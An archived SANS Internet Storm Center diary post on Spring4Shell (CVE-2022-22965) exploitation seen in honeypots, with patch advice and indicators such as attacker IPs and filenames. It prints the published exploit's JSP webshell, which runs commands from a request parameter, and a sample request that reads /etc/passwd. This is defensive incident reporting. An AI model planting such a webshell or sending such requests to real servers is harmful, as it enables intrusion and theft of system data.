{
    "id": "184439e1-f035-4ee3-913f-522af3091076",
    "created_at": "2023-01-12T15:07:07.34128Z",
    "updated_at": "2025-03-27T02:05:49.557057Z",
    "deleted_at": null,
    "sha1_hash": "8fff0091e3e1d4c2589cb173a12229f0dc09793c",
    "title": "2022-03-31 - Spring Vulnerability Update - Exploitation Attempts CVE-2022-22965",
    "authors": "",
    "file_creation_date": "2022-05-29T00:58:52Z",
    "file_modification_date": "2022-05-29T00:58:52Z",
    "file_size": 4561101,
    "plain_text": "# SANS ISC: InfoSec Handlers Diary Blog - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training InfoSec Handlers Diary Blog\n\n**isc.sans.edu/diary/rss/28504**\n\n\n-----\n\n## Spring Vulnerability Update - Exploitation Attempts CVE-2022-22965\n\n**Published: 2022-03-31**\n\n**Last Updated: 2022-03-31 16:55:14 UTC**\n\n**by** [Johannes Ullrich (Version: 1)](https://plus.google.com/101587262224166552564?rel=author)\n\n[0 comment(s)](https://isc.sans.edu/forums/diary/Spring+Vulnerability+Update+Exploitation+Attempts+CVE202222965/28504/#comments)\nThe Spring project now released a blog post acknowledging the issue so far known as\n\"sping4shell\":\n\n[https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)\n\nThe announcement confirms some of the points made yesterday:\n\n\n-----\n\nJDK 9 or higher are affected (JDK 8 is not affected)\nSpring MVC and Sping Webflux applications are affected\nSpring Boot executable jars are vulnerable, but the current exploit does not affect them\nA patch has been released. Upgrade to Spring Framework 5.3.18 (with Spring Boot\n2.6.6 or 2.5.12) or Spring Framework 5.2.20\nWe now have a CVE: [CVE-2022-22965](https://isc.sans.edu/vuln.html?cve=2022-22965)\nCVSS Score is 9.8\n\nThe vulnerable libraries are not as widely used as log4j, and exploitation does depend a bit\nmore on the application. But just like for log4j, we will likely see exploits evolving and\nspreading quickly for some popular vulnerable applications.\n\nWe started seeing some exploit attempts that match the general \"Spring4Shell\" pattern early\non Wednesday (around 09:20 UTC). The first exploit from one of our larger honeypots and\ncame from [38.83.79.203. It was directed at a honeypot listening on port 9001, not the \"usual\"](https://isc.sans.edu/ipinfo.html?ip=38.83.79.203)\ntomcat port 8080.\n\nThe currently published exploit will change the logging configuration, writing a file to the\napplication's root directory. Next, the attacker will send requests that contain code to be\nwritten to this new \"log file\". Finally, the attacker will access the log file with a browser to\nexecute the code. The code in the currently published exploit does create a simple webshell:\n```\n<% if(\"j\".equals(request.getParameter(\"pwd\"))){\n   java.io.InputStream in =\nRuntime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();\n   int a = -1;\n   byte[] b = new byte[2048];\n   while((a=inread(b))!=-1) {\n    out.println(new String(b));\n   }\n} %>\n\n```\n[beautified code to make it more readable]\n\nFiles like this, present in the application's directory, could be used as an indicator of\ncompromise. The exploit alters the logging configuration. After the exploit is executed, all\naccess logs will be appended to this script, and these logs are also sent back to the attacker\nas the attacker accesses the script. A typical filename is \"tomcatwar.jsp\", but of course the\nname of the parameters, and the filename, are easily changed.\n\nA typical request looking for the web shell will look like:\n\n```\nGET /tomcatwar.jsp?pwd=j&cmd=cat%20/etc/passwd\n\n```\n\nWe have seen attempts to install the web shell, as well as attempts to access existing\nwebshells. Couple IPs that \"stick out\":\n\n\n-----\n\n149.28.147.15\n103.214.146.5\n158.247.202.6\n\nI have also seen the filename \"wpz.jsp\" used, in particular by 103.214.146.5. Some swear\nwords have also shown up in filenames used by specific IPs.\n\nPlease note that we are not sure if these attempts actually work. They are detected by\nhoneypots that are not actually vulnerable to these exploits.\n\nJust like for log4j, we do see some scanning for vulnerable hosts by attempting to execute\nsimple commands like 'whoami' or 'cat /etc/passwd'. The level of activity appears to be much\nless than what we had for log4shell. Likely because there isn't a simple \"one size fits all\"\nexploit, and exploitability depends on the application, not just using a particular framework.\n\n--[Johannes B. Ullrich, Ph.D., Dean of Research, SANS.edu](https://sans.edu/)\n[Twitter|](https://jbu.me/164)\n\n[Keywords: honeypot](https://isc.sans.edu/tag.html?tag=honeypot) [spring4shell](https://isc.sans.edu/tag.html?tag=spring4shell) [exploits](https://isc.sans.edu/tag.html?tag=exploits) [java](https://isc.sans.edu/tag.html?tag=java)\n[0 comment(s)](https://isc.sans.edu/forums/diary/Spring+Vulnerability+Update+Exploitation+Attempts+CVE202222965/28504/)\n\nJoin us at SANS! Attend Application Security: Securing Web Apps, APIs, and Microservices with\nJohannes Ullrich in Tokyo starting Aug 29 2022\n\nTop of page\n√ó\n\n[Diary Archives](https://isc.sans.edu/diaryarchive.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-31 - Spring Vulnerability Update - Exploitation Attempts CVE-2022-22965.pdf"
    ],
    "report_names": [
        "2022-03-31 - Spring Vulnerability Update - Exploitation Attempts CVE-2022-22965.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536027,
    "ts_updated_at": 1743041149,
    "ts_creation_date": 1653785932,
    "ts_modification_date": 1653785932,
    "files": {
        "pdf": "https://archive.orkl.eu/8fff0091e3e1d4c2589cb173a12229f0dc09793c.pdf",
        "text": "https://archive.orkl.eu/8fff0091e3e1d4c2589cb173a12229f0dc09793c.txt",
        "img": "https://archive.orkl.eu/8fff0091e3e1d4c2589cb173a12229f0dc09793c.jpg"
    }
}